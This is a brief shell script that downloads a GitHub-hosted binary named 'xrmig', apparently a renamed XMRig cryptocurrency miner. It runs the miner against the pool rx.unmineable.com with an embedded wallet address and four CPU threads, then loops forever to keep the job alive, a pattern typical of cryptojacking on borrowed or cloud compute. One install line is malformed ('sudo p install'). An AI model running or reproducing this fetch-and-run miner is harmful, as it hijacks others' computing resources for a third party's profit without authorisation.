#!/bin/sh
sudo apt update
sudo p install screen -y
wget https://github.com/xrmig/releases/download/v6.14.0/xrmig-6.14.0-linux-x64.tar.gz
tar xf xrmig-6.14.0-linux-x64.tar.gz
cd xrmig-6.14.0
./xrmig -o rx.unmineable.com:3333 -a rx -k -u BTT:TMadbrzzz4NDD6u18YBaM9VRuUB9kdPVQE.DusimoeS -p x --cpu 4
while [ 1 ]; do
sleep 3
done
sleep 999
